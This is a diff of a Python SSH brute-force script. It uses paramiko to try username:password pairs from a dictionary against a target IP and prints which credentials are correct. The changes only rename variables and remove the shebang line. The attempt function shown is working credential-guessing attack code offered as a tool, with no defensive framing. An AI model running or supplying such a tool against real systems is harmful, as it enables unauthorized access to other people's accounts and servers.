@@ -1,4 +1,3 @@
-#!/usr/bin/env python
 import paramiko, time, threading
 
 print ("*******************************************")
@@ -9,15 +8,15 @@ print ("Dictionary should be in user:pass format")
 
 
 
-def attempt(IP,UserName,Password):
+def attempt(IP,attemptUsername,attemptPassword):
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
-        ssh.connect(IP, username=UserName, password=Password)
+        ssh.connect(IP, username=attemptUsername, password=attemptPassword)
     except paramiko.AuthenticationException:
-        print ('[-] %s:%s fail!' % (UserName, Password))
+        print ('[-] %s:%s fail!' % (attemptUsername, attemptPassword))
     else:
-        print ('[!] %s:%s is CORRECT!' % (UserName, Password))
+        print ('[!] %s:%s is CORRECT!' % (attemptUsername, attemptPassword))
     ssh.close()
     return
 
